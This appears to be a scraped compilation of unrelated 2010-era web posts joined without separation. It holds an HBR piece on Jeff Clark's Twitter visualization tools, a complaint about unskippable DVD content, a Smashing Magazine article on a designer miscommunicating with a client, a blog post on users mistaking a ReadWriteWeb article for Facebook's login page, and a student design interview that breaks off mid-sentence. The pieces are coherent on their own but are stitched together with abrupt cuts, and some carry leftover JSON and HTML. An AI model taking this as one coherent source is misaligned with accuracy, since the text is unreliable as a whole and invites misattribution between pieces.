      "content" : "<p>Data visualization is cool. It's also becoming ever more useful, as the vibrant online community of data visualizers (programmers, designers, artists, and statisticians — sometimes all in one person) grows and the tools to execute their visions improve.</p>\n\n<p><a href=\"http://neformix.com\">Jeff Clark </a>is part of this community. He, like many data visualization enthusiasts, fell into it after being inspired by pioneer <a href=\"http://www.bewitched.com/\">Martin Wattenberg</a>'s <a href=\"http://www.bewitched.com/marketmap.html\">landmark treemap</a> that visualized the stock market.</p>\n\n<p>Clark's latest work shows much promise. He's built four engines that visualize that giant pile of data known as Twitter. All four basically search words used in tweets, then look for relationships to other words or to other Tweeters. They function in almost real time. </p>\n\n<p>\"Twitter is an obvious data source for lots of text information,\" says Clark. \"It's actually proven to be a great playground for testing out data visualization ideas.\" Clark readily admits not all the visualizations are the product of his design genius. It's his programming skills that allow him to build engines that drive the visualizations. \"I spend a fair amount of time looking at what's out there. I'll take what someone did visually and use a different data source. Twitter Spectrum was based on things people search for on Google. Chris Harrison did interesting work that looks really great and I thought, I can do something like that that's based on live data. So I brought it to Twitter.\"</p>\n\n<p>His tools are definitely early stages, but even now, it's easy to imagine where they could be taken.</p>\n\n<p>Take <a href=\"http://www.neoformix.com/Projects/TwitterVenn/view.php\">TwitterVenn</a>. You enter three search terms and the app returns a venn diagram showing frequency of use of each term and frequency of overlap of the terms in a single tweet. As a bonus, it shows a small word map of the most common terms related to each search term; tweets per day for each term by itself and each combination of terms; and a recent tweet. I entered \"apple, google, microsoft.\" Here's what a got:</p>\n\n<p><span style=\"display:inline\"><img alt=\"twittervenn.jpg\" src=\"http://blogs.hbr.org/research/flatmm/twittervenn.jpg\" width=\"580\" height=\"540\"></span></p>\n\n<p>Right away I see Apple tweets are dominating, not surprisingly. But notice the high frequency of unexpected words like \"win\" \"free\" and \"capacitive\" used with the term \"apple.\" That suggests marketing (spam?) of apple products via Twitter, i.e. \"Win a free iPad...\". </p>\n\n<p>I was shocked at the relative infrequency of \"google\" tweets. In fact there were on average more tweets that included both \"microsoft\" and \"google\" than ones that just mentioned \"google.\"</p>\n\n<p>So then I went to <a href=\"http://www.neoformix.com/Projects/TwitterSpectrum/TwitterSpectrum.html\">Twitter Spectrum</a>, a similar tool that compares two search terms and shows which words are most commonly associated with each term and which words are most commonly used in tweets with both terms. Here's the \"google, microsoft\" Twitter Spectrum:</p>\n\n<p><span style=\"display:inline\"><img alt=\"twitterspectrum.jpg\" src=\"http://blogs.hbr.org/research/flatmm/twitterspectrum.jpg\" width=\"580\" height=\"463\"></span></p>\n\n<p>I love that the word \"ugh\" is dead center between Google and Microsoft. But the prominence of social media terms on the blue side versus search terms on the red side is fascinating. It looks like two armies marching at each other ready to fight different wars.</p>\n\n<p>Clark has also created TwitArcs. This one, I feel, is still a work in progress and Clark says \"visually I like it but it might be the least useful so far.\" In this case, you type in a tweeter's handle and it returns a stream of that person's tweets with arcs that link common words between tweets (on the right) and common retweeters (on the left). Rolling your mouse over highlights the last tweet in the arc. Here's a TwitArc of @timoreilly:</p>\n\n<p><span style=\"display:inline\"><img alt=\"twitarc.jpg\" src=\"http://blogs.hbr.org/research/flatmm/twitarc.jpg\" width=\"580\" height=\"543\"></span></p>\n\n<p>Finally, the Stream Graph. Enter a search term and Clark's engine returns the frequency of the most common words found with your search term for the last 1,000 tweets. You see a literal flow of conversation. You can also highlight one term to see how its frequency changed over time and you'll see the most recent tweets that include both your search term and that highlighted term. </p>\n\n<p>Sometimes 1,000 tweets with your term may span weeks. For my search term, \"Tiger Woods\" which I entered yesterday afternoon right after news that he'd speak publicly broke, 1,000 tweets covered about 20 minutes. Here's the \"Tiger Woods\" stream graph with \"silence\" highlighted:</p>\n\n<p><span style=\"display:inline\"><img alt=\"streamgraph.jpg\" src=\"http://blogs.hbr.org/research/flatmm/streamgraph.jpg\" width=\"580\" height=\"385\"></span></p>\n\n<p>It isn't hard to imagine how this may be applicable to business. I can already see eager marketers watching the stream flow by as their commercial debuts during next year's Super Bowl. </p>\n\n<p>Clark, like many data visualizers, believes we're on the front end of a revolution in information presentation. \"There's a lot of work done called scientific visualization or business intelligence graphics,\" he says. \"And it's pragmatic, trying to solve practical problem. It's all standard, a bar chart or pie. But those standard ways are not adequate when you're trying to mine a richer data space. The world is full of complex data and we're just starting to get the tools to make sense of it. We're looking for new ways of presenting data.\"</p>\n      \n   <div>\n<a href=\"http://feeds.harvardbusiness.org/~ff/harvardbusiness?a=GINTrKVuptE:H6BfNaPJWDw:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/harvardbusiness?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.harvardbusiness.org/~ff/harvardbusiness?a=GINTrKVuptE:H6BfNaPJWDw:bcOpcFrp8Mo\"><img src=\"http://feeds.feedburner.com/~ff/harvardbusiness?d=bcOpcFrp8Mo\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/harvardbusiness/~4/GINTrKVuptE\" height=\"1\" width=\"1\">"

I rip all my kid's DVDs (not least because she has a tendency to scratch them to hell), and the difference between firing up a movie on a laptop and it just <em>starting</em> versus trying to explain to a toddler why Daddy has to spend five minutes pressing next-next-next menu-menu-menu is enormous. I think it all comes down to the stuff in the DVD-CCA spec that allows DVD creators to flag sequences as unskippable: that's such an attractive nuisance, it's <em>bound</em> to attract every hard-sell marketer and power-tripping fool in any media company, who will eventually colonize it with so much crapola that it comes <em>just short</em> of destroying the possibility that anyone will voluntarily pay for the product.

John runs a reasonably large website. He is a marketer who considers himself smart, articulate and professional. That said, he doesn’t know much about Web design, and so he needs your help. John comes to you with a clear set of business objectives and asks for a quote. But what happens next leaves John confused, frustrated and extremely unhappy.</p><p>[Offtopic: By the way, did you know that Smashing Magazine has a <a href=\"http://creatives.commindo-media.de/www/delivery/ck.php?oaparams=2__bannerid=1249__zoneid=0__cb=be1da96c6d__oadest=http%3A%2F%2Fm.smashingmagazine.com\">mobile version</a>? Try it out if you have an iPhone, Blackberry or another capable device.]</p><h3>Explain Why You Are Asking About Money</h3><p>Before giving John his quote, you ask a little more about the project. After chatting for a few minutes, you ask him about his <strong>budget</strong>. A fair question, you think. After all, you could approach the project in so many ways. Without knowing the budget, knowing where to begin is impossible. In your mind, building a website is like building a house. Without knowing the budget, you can’t possibly know how many rooms the client can afford or what materials you should use to build.</p><p>John, on the other hand, is instantly suspicious. Why would you want to know about his budget? The only reason he can think of is that you want to make sure you don’t charge him less than what he is willing to give. Besides, he doesn’t really know his budget. How the heck is he supposed to know how much a website costs?</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/money-20100210-1629242.jpg\" width=\"599\" height=\"327\" alt=\"Money-20100210-1629242 in Is John The Client Dense or Are You Failing Him?\"><br> <em>Don’t come across as money-grubbing.</em> (<a href=\"http://flic.kr/p/6eyE3T\">Image credit</a>)</p><p>John leaves, determined to find a Web designer who doesn’t want to take advantage of him. Fortunately for you, all of the other designers he speaks with also neglect to explain why they need to know about his budget, and so you manage to win the project after all.</p><h3>Justify Your Recommendations In Language John Can Understand</h3><p>Once you have won the job, you arrange a kick-off meeting to <strong>nail down the specifications</strong>. However, John instantly regrets his decision to hire you because his worse fears have been confirmed. In his eyes, you are all of a sudden trying to squeeze more money out of him as you waffle about the importance of usability and accessibility. John doesn’t care about disabled users. He doesn’t expect disabled users to visit his website anyway.</p><p>And as for usability, surely the job of the Web designer is to make the website usable. Why do we need expensive usability testing? He is pretty certain that usability testing involves expensive things like cameras, labs and two-way mirrors. You thought you had explained these issues clearly. You spoke of WCAG 2, and you mentioned Jakob Neilsen. You are beginning to wonder if John is a bit thick.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/confused-20100210-1632551.jpg\" width=\"600\" height=\"335\" alt=\"Confused-20100210-1632551 in Is John The Client Dense or Are You Failing Him?\"><br><em>Avoid techno-babble if you expect clients to understand what you’re talking about.</em> (<a href=\"http://flic.kr/p/frJ48\">Image credit</a>)</p><p>Perhaps if you had talked about accessibility in terms of assessing search engine rankings and testing usability as a way to increase conversion, then John might have listened. As it is, John puts his foot down and refuses to pay for any of these “unnecessary extras.”</p><h3>Include John In The Process</h3><p>You walk away from the kick-off meeting pleased to have a signed contract. But that feeling in the pit of your stomach tells you that this might be another one of those projects. Regardless, you try to be optimistic, and you dive into the design process. Almost immediately, you get a phone call from John asking if there is anything for him to see. You explain that it is still early in the process and that you are not ready to present anything. John sounds disappointed but resigned.</p><p>A short while later, you are ready to <strong>present the design</strong> to John. You are pleased with the result. It took you a lot more time than you had budgeted for, but it was worth it. The final design is extremely easy to use and will make for a great portfolio piece.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/hide-20100210-1637471.jpg\" width=\"600\" height=\"263\" alt=\"Hide-20100210-1637471 in Is John The Client Dense or Are You Failing Him?\"><br> <em>Stop hiding from your clients. Show them your work early on, and include them in the process.</em> (<a href=\"http://flic.kr/p/4n6M23\">Image credit</a>)</p><p>When John sees the design, he is horrified. From his perspective, you have entirely missed the point. The design clashes with his offline marketing materials and doesn’t hit the right selling points. Also, he is convinced that his suppliers will hate it and, although they are not his end users, their opinion matters.</p><p>After a tense conference call, you feel demoralized but have struck a compromise that hopefully will make John happy. You wonder in hindsight whether showing John some of your initial ideas and sketches would have been better. Perhaps you should have presented a wireframe first.</p><h3>Educate John About Design</h3><p>After much agonizing and compromise, you are once again ready to present to John. John is much happier with the new design and feels it is heading in the right direction. However, he does have some concerns. For starters, he has to scroll to see most of the content, and yet white space takes up either side of the design. He tells you to move key content into this wasted space. Also, as he thinks about his young male target audience, he realizes that the color scheme is too effeminate, so he tells you to change it to blue.</p><p>While John feels somewhat happier, you feel crushed. You feel as though he is trying to do the job for you. The instructions to move this there and change this color to that makes you feel like you have been reduced to pushing pixels.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/Teaching-20100210-164155.jpg\" width=\"600\" height=\"303\" alt=\"Teaching-20100210-164155 in Is John The Client Dense or Are You Failing Him?\"><br> <em>Educate your clients so they make more informed decisions.</em> (<a href=\"http://flic.kr/p/Hf2E7\">Image credit</a>)</p><p>By this point, you are sure the client is dim, and now you just want him to sign off on a design. At no stage do you think to ask John <strong>why he is requesting these changes</strong>. Perhaps if you had appreciated his thinking, you could have explained concepts such as screen resolution and suggested an alternative to corporate blue, which is so over-used on the Web.</p><p>Instead, you wash your hands of the design and just give John what he wants.</p><h3>Communicate With John Regularly</h3><p>Now that the design is complete, you turn your attention to building it. John certainly won’t care about your code. Now you can finally do things right.</p><p>It’s a big job and takes a lot of time. Even though you put too much time into the design and washed your hands of it, you still have your pride. You are not about to cut corners with the code. After all, other designers might look at it and judge you! You work really hard, putting in more work than you probably should have. John even manages to slip in some extra functionality at the scoping phase, which turns out to be a pain in the butt.</p><p>For his part, John is wondering what’s going on. He hasn’t heard from you in weeks. Surely the website must be ready now? He decides to email you to ask how things are progressing. You reply with a short email telling him that everything is progressing smoothly. You never did like project management, and you are sure John would prefer that you spend time building his website instead of writing him detailed reports.</p><p>John receives your email and is becoming increasingly frustrated. What does “progressing smoothly” mean? He writes back asking for an expected date of completion, and you reply with a rough estimate.</p><p>The date comes and goes without a word from you. After all, it was merely an estimate, and several complications have delayed completion by a few days. John finally loses his temper and calls you. He tells you that he has arranged a marketing campaign to coincide with the launch date, and because he hadn’t heard from you, he presumed everything was on schedule.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/communication-20100210-1645141.jpg\" width=\"599\" height=\"322\" alt=\"Communication-20100210-1645141 in Is John The Client Dense or Are You Failing Him?\"><br> <em>Communicate with your client regularly.</em> (<a href=\"http://flic.kr/p/691uEj\">Image credit</a>)</p><p>You defend yourself, citing “scope creep” and unanticipated delays. But responding is difficult when John says, “All I needed was a weekly email keeping me up to date on progress.”</p><h3>Explain John’s Ongoing Role</h3><p>By this stage, the relationship has broken down entirely. You finish your work, and the website finally launches. Begrudgingly, John pays the invoice after delaying it for as long as possible. What amazes you most is John’s pronouncement that he is bitterly disappointed with the result. How can that be when you gave him exactly what he asked for? This guy isn’t just thick: he’s a jerk!</p><p>Of course, John sees things differently. He came to you with a list of his business objectives, and the website has failed to meet any of them. He had hoped to launch the website, watch it <strong>achieve his objectives</strong> and then move on to the next project. Instead, after an initial spike in interest, the number of users and inquiries dropped over time, and the website stagnated.</p><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2010/02/seedling-20100210-164927.jpg\" width=\"600\" height=\"397\" alt=\"Seedling-20100210-164927 in Is John The Client Dense or Are You Failing Him?\"><br> <em>Ensure that your client understands what kind of ongoing care their website will need.</em> (<a href=\"http://flic.kr/p/68QFDp\">Image credit</a>)</p><p>What John does not realize is that websites need continued love and support. You cannot build a website and then abandon it. John has to nurture it by adding new content, engaging with visitors and planning for ongoing development.</p><p>If only someone had told him.</p><h3>The Moral Of The Story</h3><p>It’s amazing how quick we are to judge our clients.</p><p>As Web designers, we communicate and empathize for a living. Our job is to communicate messages to our clients’ users. We create usable websites by putting ourselves in the position of our users, which allows us to design around their needs.</p><p>Why, then, do we so often seem to be incapable of empathizing or communicating with our clients? Perhaps it is time for us to apply the skills we have cultivated as Web designers to our own customers.</p><p><em>(al)</em></p><hr><p><small>© Paul Boag for <a href=\"http://www.smashingmagazine.com\">Smashing Magazine</a>, 2010. | <a href=\"http://www.smashingmagazine.com/2010/02/19/is-john-the-client-dense-or-are-you-failing-him/\">Permalink</a> | <a href=\"http://www.smashingmagazine.com/2010/02/19/is-john-the-client-dense-or-are-you-failing-him/#comments\">146 comments</a> | <a title=\"Bookmark in del.icio.us\" href=\"http://del.icio.us/post?url=http://www.smashingmagazine.com/2010/02/19/is-john-the-client-dense-or-are-you-failing-him/&amp;title=Is%20John%20The%20Client%20Dense%20or%20Are%20You%20Failing%20Him?\">Add to del.icio.us</a> | <a title=\"Bookmark in Digg\" href=\"http://digg.com/submit?phase=2&amp;url=http://www.smashingmagazine.com/2010/02/19/is-john-the-client-dense-or-are-you-failing-him/\">Digg this</a> | <a title=\"Stumble on StumbleUpon\" href=\"http://www.stumbleupon.com/submit?url=http://www.smashingmagazine.com/2010/02/19/is-john-the-client-dense-or-are-you-failing-him/\">Stumble on StumbleUpon!</a> | <a title=\"Tweet us!\" href=\"http://twitter.com/home?status=@tweetmeme%20@smashingmag%20Reading%20&#39;Is%20John%20The%20Client%20Dense%20or%20Are%20You%20Failing%20Him?&#39;%20http://www.smashingmagazine.com/2010/02/19/is-john-the-client-dense-or-are-you-failing-him/\">Tweet it!</a> | <a title=\"Bookmark in Reddit\" href=\"http://reddit.com/submit?url=http://www.smashingmagazine.com/2010/02/19/is-john-the-client-dense-or-are-you-failing-him/\">Submit to Reddit</a> | <a href=\"http://forum.smashingmagazine.com/\">Forum Smashing Magazine</a><br> Post tags: <a href=\"http://www.smashingmagazine.com/tag/clients/\" rel=\"tag\">clients</a><br> </small></p>"

All of the techniques need only a couple of lines of CSS. You are not literally cropping, which is why it’s called faux image cropping.

      "content" : "<p>The site ReadWriteWeb recently did an article called <a href=\"http://www.readwriteweb.com/archives/facebook_wants_to_be_your_one_true_login.php#comment-187834\">Facebook wants to be your one true login</a>.  The contents of this article are something I’ll address in another post.  What I want to talk about today has nothing to do with the actual contents of the article, and everything to do with the fact that this article was for some period of time one of the highest hits on Google for the search “Facebook login”.</p>\n<p>The comments thread on the article filled up with over a thousand comments from confused and frustrated people asking “Now how do I log in?” and “The new design sucks!”.</p>\n<p>That’s right.  These people had been relying on a Google search for “Facebook login” to get to the Facebook login page.  When they ended up at ReadWriteWeb instead, <i>they didn’t know that they were in the wrong place</i>.  They thought that the Facebook login page had changed, and they weren’t happy about it.  ReadWriteWeb has now put up a gigantic disclaimer on the article to explain that they are not Facebook and explain how to get there.</p>\n<p>This whole chain of events seems destined to go down in Internet history as an amazing pile-up of failure.</p>\n<p>Reactions seem divided into two camps.  One camp is <a href=\"http://blogs.telegraph.co.uk/technology/shanerichmond/100004656/facebook-login-cancel-google-and-the-perfect-storm-of-idiots/\">having a great laugh at the stupidity of the users</a> – after all, how could they look at a page with a red masthead, titled “ReadWriteWeb”, featuring a news article, and think they were on the Facebook login page?  How could they be smart enough to figure out how to leave a comment, but too dumb to know what site they were on?</p>\n<p>The other camp, for example an article from blogger Funkatron called <a href=\"http://funkatron.com/site/comments/were-the-stupid-ones-facebook-google-and-our-failure-as-developers/\">We’re the stupid ones</a> is pointing the finger at the software world for assuming that everyone knows as much about computers as we do, and more specifically at Google – after all, isn’t this in some way Google’s screw-up for returning the wrong result?</p>\n<p>Well, the name of this blog is “Not the User’s Fault”, so much as I would like to have a laugh at stupidity and then move on, I think it’s better to try to understand what this must have been like from those users’ point of view, and see if there’s anything we can learn from the whole boondoggle.</p>\n<p><span></span></p>\n<p>You and I know that the URL in the location bar is an ever-present answer to the question <i>where am I ?</i>.  Any time something seems wrong, we’ve got a habit of checking the URL to see if we’re where we thought we were.  If you’re in the habit of paying attention to the URL, then it’s hard to see how you could mistake ReadWriteWeb for facebook.</p>\n<p>So what this mess teaches us is that <i>there are lots of people out there who don’t know how to read a URL</i>.  The URL in the location bar, if they notice it at all, must appear to them as nothing but a bunch of computer gibberish.</p>\n<p>Think about it from their point of view.  They knew that Googling “facebook login” and then clicking the first link took them to their Facebook login.  I wouldn’t call it the best way of getting to Facebook, but it was obviously working for these poor souls.  Until one day, they saw something they didn’t expect.  If you don’t know how URLs work, then all you know is that your expected Facebook login page has somehow been replaced with… something else.</p>\n<p>You know how, in Firefox 3, you can type something that’s not a URL into the location bar, and it’ll invisibly do a Google “I’m feeling lucky” search and take you straight to the result?  (I just checked and, as of right now, typing “facebook login” there does indeed take me to the Facebook login page.)  Great time-saving feature, right?  But what if you come to rely on that feature without really understanding how it works… and then one day the result changes?  I don’t know if any of the confused users on ReadWriteWeb got there using Firefox 3, but it seems plausible that some of them did just that.</p>\n<p>This “time-saving feature” is great if you know what you’re doing… but isn’t it a bit dangerous to give to people who don’t understand URLs?</p>\n<p>Above, I said that the URL was the answer to the question “Where am I?”.  Actually, that’s not quite true.  The URL is looked up in a DNS server to determine an IP address, and then the browser connects to an HTTP server on whatever computer that IP address points to.  The IP is the real location; the URL is just a human-readable way of looking up the IP.  It almost always works the way you expect, and you don’t have to think about it…. except that DNS servers can be hacked.  URLs can be spoofed.  You can enter a URL and end up connected to a different server than the one you wanted.</p>\n<p>When people type “facebook login” into the Firefox URL bar, or into a Google I’m-feeling-lucky search, then aren’t they really just using Google as a sort of higher-level DNS lookup?  One that turns their English description of what they want into a URL?   From their point of view, what happened to them with ReadWriteWeb is no different from a spoofed URL or a hacked DNS server taking them to the wrong place.  It doesn’t seem so funny anymore, does it?</p>\n<p>Is there anything we can do about this?   A while ago I wrote <a href=\"http://jonoscript.wordpress.com/2009/12/12/what-support-teaches-us-about-teaching-users/\">a post about doing user support for Firefox</a>, where I said:</p>\n<blockquote><p>\nYou can simplify the material down until it reaches the student’s current level of understanding.  Or you can raise the student’s level of understanding until they become capable of grasping the material.\n</p></blockquote>\n<p>So right now we’ve got people who don’t understand URLs.  Do we simplify the Web for their benefit?  Or do we raise their level of understanding?</p>\n<p>I think it has to be the latter.  The idea of navigating by URL is so fundamental to how the Web works that it’s hard to imagine abstracting it away.  More than that, trying to abstract it away is <i>dangerous</i>.  Imagine someone who doesn’t understand URLs clicking on a link in a phishing attack that takes them to a fake PayPal or whatever.  If they don’t know to look at the URL, how are they going to have any idea that they’re not on the real PayPal?</p>\n<p>People using the Web without understanding URLs are quite literally putting themselves in danger, just as if they went out driving on the road without understanding how to read road signs.</p>\n<p>I’m not suggesting that we, like, make people take a driver’s test or earn a license before they’re allowed to use the Web.  I’m not sure <i>what</i> solution to this is, but I know it involves doing a better job of educating people.  Maybe Firefox could do more to teach first-time users what URLs are and why they should pay attention to them.</p>\n<p>If there was ever something like <a href=\"http://jonoscript.wordpress.com/2009/12/14/a-tutorial-level-for-the-internet/\">a video-game tutorial level for the Internet</a>, then reading URLs surely ought to be one of the skills that the “player” needs to master before moving on.</p>\n<br>  <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gocomments/jonoscript.wordpress.com/674/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/comments/jonoscript.wordpress.com/674/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godelicious/jonoscript.wordpress.com/674/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/delicious/jonoscript.wordpress.com/674/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/gostumble/jonoscript.wordpress.com/674/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/stumble/jonoscript.wordpress.com/674/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/godigg/jonoscript.wordpress.com/674/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/digg/jonoscript.wordpress.com/674/\"></a> <a rel=\"nofollow\" href=\"http://feeds.wordpress.com/1.0/goreddit/jonoscript.wordpress.com/674/\"><img alt=\"\" border=\"0\" src=\"http://feeds.wordpress.com/1.0/reddit/jonoscript.wordpress.com/674/\"></a> <img alt=\"\" border=\"0\" src=\"http://stats.wordpress.com/b.gif?host=jonoscript.wordpress.com&amp;blog=3902169&amp;post=674&amp;subd=jonoscript&amp;ref=&amp;feed=1\">"

For students who aspire to work in design, what would you recommend they study?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/books.jpg\" alt=\"Books in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"372\"></p><h4>David Leggett</h4><p>Finding a good university-level design program that interests you will greatly increase your chance of finding awesome opportunities down the road, but it’s very beneficial to get experience before and <strong>outside</strong> of the education system. Find projects to help with, start your own, read up and apply as much as you can as you’re learning on the side. The extra experience will never hurt, and at the very least you’ll get to see if design is something you really enjoy.</p><p>Just to clarify, I have never taken any higher education courses in design, but I know the knowledge you get in that environment is valuable, as I’m sure others will suggest.</p><h4>Wolfgang Bartelme</h4><p>Well, I guess the most important thing is “<strong>practice, practice, practice</strong>.” To improve the quality of your work, you have to keep pushing yourself further and further. By the way, many great artists are self-taught. But I’m also convinced that a profound education will sharpen your skills and help you be able to judge why and how certain designs work. Personally, I studied “Information Design” at the University of Applied Science in Graz, focusing on all different aspects of design: print and advertising, exhibitions, Web design, usability, photography and film — thus giving students a wide range of knowledge, and making them more generalists than specialists.</p><h3>2. How does a student determine whether design is for them or they should pursue another career?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/pencils.jpg\" alt=\"Pencils in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"365\"></p><h4>Jacob Gube</h4><p>This is a question you have to ask yourself. There aren’t any set rules or algorithms to determine whether you should be a designer. The important thing is to have <strong>passion</strong> for the work. Even mediocre designers will be able to sustain themselves, but they’ll have to work extra hard to compete with more talented and experienced designers. So, it all boils down to how much you want to be a designer and how much you’re willing to work at it and push forward. I won’t sugar-coat the current situation: the truth is that the industry is saturated, and there are a lot more designers than jobs, so you have to be sure that this is the profession you want to invest your time in.</p><h4>Henry Jones</h4><p>I think it’s all about <strong>passion</strong>. If you find yourself up late at night working on design projects just for the fun of it, then that’s a good sign that design is right for you. I think one of the worst situations in life is hating what you do. Loving what you do means you’ll probably be doing it and thinking about it even outside of class or when you’re not being paid to do it. You’ll constantly be honing your skills and staying on top of the latest technologies, which is very important for designers.</p><h4>David Leggett</h4><p>Everyone has a unique situation, and I don’t mean to suggest the following is always true: if you’re already a student at a university and have no outside experience, it may be difficult to really pursue a career in design. I say this only because personal friends of mine have struggled to find jobs in this current economic climate. Experience and something to show for your knowledge goes a long way.</p><p>Otherwise, be sure you truly <strong>enjoy</strong> whatever you decide to pursue. Many designers and artists I’ve met thoroughly enjoy their lifestyles, even when they’re struggling to find work. This is not to say that you should undervalue your work, but if you can enjoy your career when you’re not making money, then it’s probably a good match for you.</p><h4>Wolfgang Bartelme</h4><p>First and foremost, designing stuff has to be <strong>fun</strong>: you have to love what you do. If that’s not the case, look for something else. Secondly, you should, of course, have a decent measure of talent and imagination. Even though you will learn many skill in the course of your studies, without talent and imagination your work will be at best mediocre.</p><h4>Chris Spooner</h4><p>As with any career, if you’re <strong>passionate</strong> about the subject, you’re set to succeed. Careers in the design industry can seem exciting; after all, all you do is sit and color things in all day, right? I think this draws in a lot of people who maybe haven’t been particularly creative in the past and see the career as easy. This type of person might then find it difficult to be motivated to learn the required skills and to continue developing those skills throughout their career. That’s not to say that if you’ve weren’t a creative child, you can’t pursue a career in design. We all stumble across different interests throughout our lives, so as long as you feel you have a passion for design, go for it!</p><h3>3. How do you balance education and work?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/balance.jpg\" alt=\"Balance in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"431\"></p><h4>Zach Dunn</h4><p>By my last estimate, I spend about 3 to 4 hours on client work for every 1 hour of academic work. I generally learn specialized skills more from client work than from academics. It’s easy to get caught up in client work and blogging. The hard part is making sure you don’t lose touch with the world around you. Interacting with clients and blog community members is certainly social, but you need to take a break and interact with “regular college students” from time to time. I consider it like mental detox.</p><p>I’m convinced you must put in extra time on personal projects to truly become competent in the Web design industry. Going through the motions during class and homework hours only leaves you behind. The Internet moves faster than any standard academic schedule. Keeping current and practiced is up to you.</p><h4>Jacob Cass</h4><p>Finding the right balance between family, friends, work and all of life’s other misdemeanors will always be a challenge, no matter what your career. You must set <strong>priorities</strong> and goals relative to what you want to achieve and get out of life. Although I have now finished studying (officially), I could say that my biggest challenge then was finding enough time to give high-quality attention to all projects, whether they were educational, personal or for paying customers. At times, I found this nearly impossible, and to be honest a lot of my university and personal work suffered from my commitments to paying customers. In saying this, I guess a lot of it comes down to having priorities, goals and good time management.</p><h3>4. How did work outside your studies prepare you for your career?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/clock.jpg\" alt=\"Clock in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"339\"></p><h4>Zach Dunn</h4><p>Almost all of our “career” success so far has been a direct result of work done <strong>outside</strong> of studies. College is a great incubator for a number of things other than academics. I value school for reasons that are different than those of the average person. College has helped me socially. Sam recently wrote an article that does a great job of explaining more about our college philosophy in relation to Web design, titled <a href=\"http://buildinternet.com/2009/12/the-role-of-college-for-web-designers/\">The Role of College for Web Designers</a>.</p><p>Certain career paths cannot start before graduation date. Lawyers, for example, can’t have hobby clients while putting themselves through school: it’s all or nothing. Web design isn’t limited by credentials for entry. Web design is largely portfolio-based. When’s the last time a client was more interested in your GPA than in your previous client work? In this industry, we have the luxury of starting early. I like to take advantage of that.</p><p>I don’t know what the future holds for Sam and me, but I’m confident that at least some of the projects we start today will have some role in it.</p><h4>Jacob Cass</h4><p>To be honest, I learned more in six months of blogging and following other people’s blogs, than studying for three full years at university. Doing extra work <strong>outside</strong> of the education system is vital.</p><h3>5. What should students and new designers focus on outside of their course work to advance in their careers?</h3><p><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2009/12/laptop.jpg\" alt=\"Laptop in Group Interview: Expert Advice For Students and Young Web Designers\" width=\"575\" height=\"431\"></p><h4>Brian Hoff</h4><p>Students should definitely consider taking many <strong>business</strong> classes, especially if they want to go freelance or start their own studio one day. I’ve always been passionate enough about design to teach myself, but I wish I took more business and marketing classes. Also, I would recommend collecting designs. Having resources of inspiration and also an idea of good design is essential. I take photos of many types, colors, designs, etc. as I pass them by, and I use LittleSnapper to organize online media. Being a graphic designer is non-stop learning. Here’s an article I wrote that covers more: <a href=\"http://www.thedesigncubicle.com/2008/11/16-tips-to-improve-as-a-graphic-designer/\">16 Tips to Improve as a Graphic Designer</a>.</p><h4>Chris Coyier</h4><p>No individual program is going to cover every single angle of design, especially the most modern technological stuff. Because you are already reading Smashing Magazine, you probably already have a good grasp of what’s going on in modern design. Reading and following tutorials and doing your own experimental projects on the side will definitely help you excel. That being said, your whole life doesn’t have to revolve around career enhancement. A <strong>well-rounded</strong> life will serve you well. Perhaps some of your other hobbies could benefit from your design talent. I have a friend who used to build coffee tables and decorate the surfaces with patterns of partially burnt matches. If he were looking for a design job, I would absolutely tell him to put that stuff onto an online portfolio.</p><h4>Elliot Jay Stocks</h4><p>Build your portfolio. Do free websites for your mates’ bands or your Mum’s friend’s wool shop. It might not be glamorous work, but doing as much as you can builds up your portfolio, and you’ll learn loads on every project. When I left university and got my first job, my portfolio was made up almost entirely of stuff I’d done on an extracurricular basis, not really the course work itself. But also don’t forget that it’s about <strong>quality</strong>, not quantity, and a good portfolio strikes a balance between variety (showing that you’re versatile) and continuity (showing that you have your own identity as a designer).</p><h4>Walter Apai</h4><p>It’s important to expand your knowledge to any areas that are related to design. Most design courses concentrate on the basics or on how to use the various pieces of software that are available. These are just basic tools for new designers, but they won’t make you a great designer.</p><p>Learn about art, layout and composition, and try to read at least one new book on design every month, or even one per week. Subscribe to design blogs such as Smashing Magazine and Webdesigner Depot, and never stop learning. Keep updating your knowledge whenever possible by attending conferences, reading books and magazines and becoming involved in the local artistic community. Try to become a well-rounded designer, not just an operator of Photoshop or another design software tool.</p><p>George Lois, the real-life inspiration for Don Draper in Mad Men, said it best:</p><blockquote><p>“The computer has played a role in destroying creativity with Photoshop. Everybody thinks they’re a designer.”</p></blockquote><p>While he may be generalizing a bit, I believe what is meant is that you can’t be a proper designer without understanding the <strong>fundamentals</strong> of art and design.</p><h4>Jacob Gube</h4><p>When I was a college student, what truly helped me in my 